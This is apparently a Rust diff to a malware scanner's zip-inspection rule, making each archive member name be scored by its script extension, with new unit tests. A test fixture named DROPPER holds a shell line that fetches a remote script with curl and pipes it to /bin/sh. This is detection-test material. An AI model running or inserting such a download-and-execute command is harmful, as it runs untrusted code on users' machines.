@@ -9,8 +9,10 @@ use super::{embedded_content_ruleset, Rule, RuleOutcome};
 use crate::context::ScanContext;
 use crate::model::{MatchedSignal, ScanCompleteness, SignalCategory};
 use crate::scan::scan_context;
+use crate::textclass::has_script_extension;
 use crate::zip::{self, Member, ZipLimits};
 use std::collections::HashMap;
+use std::path::Path;
 
 /// Ceiling on what the member rule contributes; Phase 0a scoring is a plain
 /// sum (§12), and many members with weak hits must not add up to an alert.
@@ -102,43 +104,79 @@ pub(super) fn scored_through_members(ctx: &ScanContext) -> bool {
 }
 
 fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
+    inspect_with_rules(ctx, limits, &embedded_content_ruleset())
+}
+
+/// [`inspect`] scoring members' content with `rules`.
+fn inspect_with_rules(
+    ctx: &ScanContext,
+    limits: &ZipLimits,
+    rules: &[Box<dyn Rule>],
+) -> Option<ZipInspection> {
     let content = ctx.content.as_deref()?;
     if ctx.truncated || is_zip(ctx) != Some(true) || inside_app_bundle(ctx) {
         return None;
     }
-    let rules = embedded_content_ruleset();
     let mut findings = Listing::default();
     let mut strongest: HashMap<(String, String), i32> = HashMap::new();
     let mut unsigned = Listing::default();
     let mut unsigned_weight = 0;
     let mut member_gaps = Listing::default();
     let read = zip::read(content, limits, &mut |m: Member| {
-        let label = format!("{}!{}", ctx.path.display(), m.path);
-        let member = ScanContext::from_embedded_bytes(label, m.bytes, m.cut);
-        let mut gap = |reason: &str| member_gaps.push(format!("{}: {reason}", m.path));
-        for reason in unread_container_reasons(&member) {
-            gap(&reason);
-        }
-        let macho = member.macho();
-        if macho.is_macho {
-            let signature = member_signature(macho);
-            if let Some((weight, description)) = signature.finding {
-                unsigned_weight = unsigned_weight.max(weight);
-                unsigned.push(format!("{}: {description}", m.path));
+        let label = |name: &str| format!("{}!{name}", ctx.path.display());
+        // A name changes the content rules' result only by its extension, so
+        // the bytes are scanned once per class and reported under each name.
+        let names: Vec<(&str, bool)> = std::iter::once(m.path)
+            .chain(m.aliases.iter().map(String::as_str))
+            .map(|name| (name, has_script_extension(Path::new(&label(name)))))
+            .collect();
+        let both = names.iter().any(|n| n.1) && names.iter().any(|n| !n.1);
+        let mut bytes = Some(m.bytes);
+        let mut keep_copy = both;
+        // Indexed by script-extension class; filled by its first name.
+        let mut scanned: [Option<_>; 2] = [None, None];
+        // Directory order, so the bounded lists show the same names as before.
+        for &(name, script) in &names {
+            let slot = &mut scanned[usize::from(script)];
+            let (reasons, signature, result) = &*slot.get_or_insert_with(|| {
+                let bytes = match bytes.take() {
+                    Some(b) if std::mem::take(&mut keep_copy) => {
+                        bytes = Some(b.clone());
+                        b
+                    }
+                    b => b.unwrap_or_default(),
+                };
+                let member = ScanContext::from_embedded_bytes(label(name), bytes, m.cut);
+                let macho = member.macho();
+                let signature = macho.is_macho.then(|| member_signature(macho));
+                (
+                    unread_container_reasons(&member),
+                    signature,
+                    scan_context(&member, rules),
+                )
+            });
+            let mut gap = |reason: &str| member_gaps.push(format!("{name}: {reason}"));
+            for reason in reasons {
+                gap(reason);
             }
-            if signature.unverified {
-                gap("signature not verified — extract and scan");
+            if let Some(signature) = &signature {
+                if let Some((weight, description)) = &signature.finding {
+                    unsigned_weight = unsigned_weight.max(*weight);
+                    unsigned.push(format!("{name}: {description}"));
+                }
+                if signature.unverified {
+                    gap("signature not verified — extract and scan");
+                }
             }
-        }
-        let result = scan_context(&member, &rules);
-        for signal in &result.signals {
-            let key = (signal.id.clone(), finding_text(&signal.description));
-            let best = strongest.entry(key).or_insert(signal.weight);
-            *best = (*best).max(signal.weight);
-            findings.push(format!("{}: {}", m.path, signal.description));
-        }
-        if !m.cut && result.completeness != ScanCompleteness::Complete {
-            gap("member not fully scanned");
+            for signal in &result.signals {
+                let key = (signal.id.clone(), finding_text(&signal.description));
+                let best = strongest.entry(key).or_insert(signal.weight);
+                *best = (*best).max(signal.weight);
+                findings.push(format!("{name}: {}", signal.description));
+            }
+            if !m.cut && result.completeness != ScanCompleteness::Complete {
+                gap("member not fully scanned");
+            }
         }
     });
     let mut gaps = Listing::default();
@@ -150,6 +188,7 @@ fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
     }
     gaps.more += read.more_gaps;
     gaps.push_all(member_gaps);
+    ctx.add_decoded(read.decoded);
     Some(ZipInspection {
         findings,
         strongest,
@@ -268,7 +307,7 @@ mod tests {
     use crate::model::ScanResult;
     use crate::rules::{default_ruleset, UninspectedContainerRule};
     use crate::test_support::write_temp_file;
-    use crate::zip::tests_support::{build, plain, Layout, Spec};
+    use crate::zip::tests_support::{build, plain, with_names, Layout, Spec};
 
     const DROPPER: &[u8] = b"#!/bin/sh\ncurl -fsSL http://198.51.100.9/x.sh | /bin/sh\n";
 
@@ -375,6 +414,102 @@ mod tests {
             sig.description
         );
         assert!(container_signal(&ctx).is_some_and(|s| s.description.contains("notes.txt")));
+    }
+
+    /// The member of `plain(spec)` under `names` as well.
+    fn aliased(spec: Spec, names: &[&str]) -> ScanContext {
+        let names: Vec<String> = names.iter().map(|n| n.to_string()).collect();
+        ctx(with_names(&plain(&[spec]), &names))
+    }
+
+    #[test]
+    fn each_name_of_a_member_is_scored_by_its_extension() {
+        // Name markers count only in a script, and only the extension says so.
+        let ctx = aliased(
+            Spec::stored("a", b"osascript; curl x"),
+            &["notes.txt", "run.command", "b.sh", "c"],
+        );
+        let sig = member_signal(&ctx).expect("finding");
+        let named = |n: &str| sig.description.contains(&format!("{n}: "));
+        assert!(named("run.command") && named("b.sh"), "{}", sig.description);
+        assert!(!named("notes.txt") && !named("c"), "{}", sig.description);
+    }
+
+    /// Counts the members it is run on.
+    struct Counting(std::sync::Arc<std::sync::atomic::AtomicUsize>);
+
+    impl Rule for Counting {
+        fn id(&self) -> &'static str {
+            "counting"
+        }
+
+        fn category(&self) -> SignalCategory {
+            SignalCategory::StaticSuspicion
+        }
+
+        fn evaluate(&self, _ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
+            self.0.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+            Ok(None)
+        }
+    }
+
+    /// Matches every member.
+    struct Always;
+
+    impl Rule for Always {
+        fn id(&self) -> &'static str {
+            "always"
+        }
+
+        fn category(&self) -> SignalCategory {
+            SignalCategory::StaticSuspicion
+        }
+
+        fn evaluate(&self, _ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
+            Ok(Some(MatchedSignal {
+                id: self.id().to_string(),
+                weight: 1,
+                description: "hit".to_string(),
+                category: self.category(),
+            }))
+        }
+    }
+
+    #[test]
+    fn names_are_listed_in_directory_order_not_by_class() {
+        let names: Vec<String> = (0..20)
+            .map(|i| match i % 2 {
+                0 => format!("m{i}.sh"),
+                _ => format!("m{i}"),
+            })
+            .collect();
+        let names: Vec<&str> = names.iter().map(String::as_str).collect();
+        let ctx = aliased(Spec::stored("a", b"x"), &names);
+        let rules: Vec<Box<dyn Rule>> = vec![Box::new(Always)];
+        let read = inspect_with_rules(&ctx, &ZipLimits::default(), &rules).unwrap();
+        assert_eq!(read.findings.kept.len(), MAX_LISTED);
+        let shown = read.findings.join(MAX_LISTED);
+        assert!(shown.contains("m0.sh: hit"), "{shown}");
+        assert!(shown.contains("m1: hit"), "{shown}");
+    }
+
+    #[test]
+    fn many_names_of_one_member_scan_its_content_at_most_twice() {
+        let names: Vec<String> = (0..200)
+            .map(|i| match i % 2 {
+                0 => format!("m{i}.sh"),
+                _ => format!("m{i}"),
+            })
+            .collect();
+        let names: Vec<&str> = names.iter().map(String::as_str).collect();
+        let ctx = aliased(Spec::deflated("a", &[b'q'; 50_000]), &names);
+        let count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+        let rules: Vec<Box<dyn Rule>> = vec![Box::new(Counting(count.clone()))];
+        let read = inspect_with_rules(&ctx, &ZipLimits::default(), &rules).unwrap();
+        assert_eq!(count.load(std::sync::atomic::Ordering::Relaxed), 2);
+        // Each directory name disagrees with the local `a`, and is reported.
+        assert_eq!(read.gaps.kept.len() + read.gaps.more, 200);
+        assert!(!read.gaps.join(MAX_LISTED).contains("read budget"));
     }
 
     #[test]
